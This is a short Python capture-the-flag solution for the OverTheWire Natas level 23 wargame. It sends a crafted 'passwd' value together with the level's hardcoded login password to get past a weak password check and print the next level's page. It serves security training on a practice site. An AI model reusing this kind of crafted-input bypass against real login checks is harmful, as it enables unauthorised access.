#!/usr/bin/env python3
import requests

url = 'http://natas23.natas.labs.overthewire.org/?passwd=69iloveyou'
auth = ("natas23", "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE")
r = requests.get(url, auth=auth)
print(r.text)
